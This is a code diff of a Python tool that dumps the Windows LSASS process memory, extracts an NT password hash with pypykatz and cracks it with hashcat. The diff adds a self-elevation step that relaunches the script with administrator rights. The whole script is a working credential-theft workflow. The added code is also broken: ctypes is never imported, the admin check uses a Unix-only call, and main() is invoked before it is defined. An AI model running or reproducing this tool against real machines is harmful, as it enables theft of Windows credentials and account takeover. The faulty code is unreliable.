@@ -1,5 +1,48 @@
 import subprocess
 import os
+import sys
+
+def is_admin():
+    try:
+        return os.geteuid() == 0
+    except AttributeError:
+        return False
+
+if not is_admin():
+    # Re-run the script with admin rights on Windows
+    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
+else:
+    main()
+
+def main():
+    dump_path = "C:\\lsass.dmp"
+
+    # Step 1: Get LSASS Process ID
+    lsass_id = get_lsass_id()
+    if not lsass_id or not lsass_id.isdigit():
+        print("Failed to retrieve a valid LSASS Process ID.")
+        return
+
+    # Step 2: Create LSASS Dump
+    dump_file = create_dump(lsass_id, dump_path)
+    if not dump_file:
+        return
+
+    # Step 3: Run pypykatz to extract NT hash
+    nt_hash = run_pypykatz(dump_file)
+    if not nt_hash:
+        print("Failed to extract NT hash.")
+        return
+
+    print(f"Extracted NT hash: {nt_hash}")
+
+    # Step 4: Prompt for wordlist path and run hashcat
+    wordlist_path = input("Enter the full path to the wordlist: ").strip()
+    if not os.path.exists(wordlist_path):
+        print("Invalid wordlist path. Exiting.")
+        return
+
+    run_hashcat(nt_hash, wordlist_path)
 
 def get_lsass_id():
     """Retrieve the LSASS Process ID."""
@@ -52,36 +95,6 @@ def run_hashcat(nt_hash, wordlist_path):
         print("Hashcat completed successfully.")
     except subprocess.CalledProcessError as e:
         print(f"Error running hashcat: {e.stderr}")
-
-def main():
-    dump_path = "C:\\lsass.dmp"
-
-    # Step 1: Get LSASS Process ID
-    lsass_id = get_lsass_id()
-    if not lsass_id or not lsass_id.isdigit():
-        print("Failed to retrieve a valid LSASS Process ID.")
-        return
-
-    # Step 2: Create LSASS Dump
-    dump_file = create_dump(lsass_id, dump_path)
-    if not dump_file:
-        return
-
-    # Step 3: Run pypykatz to extract NT hash
-    nt_hash = run_pypykatz(dump_file)
-    if not nt_hash:
-        print("Failed to extract NT hash.")
-        return
-
-    print(f"Extracted NT hash: {nt_hash}")
-
-    # Step 4: Prompt for wordlist path and run hashcat
-    wordlist_path = input("Enter the full path to the wordlist: ").strip()
-    if not os.path.exists(wordlist_path):
-        print("Invalid wordlist path. Exiting.")
-        return
-
-    run_hashcat(nt_hash, wordlist_path)
 
 if __name__ == "__main__":
     main()
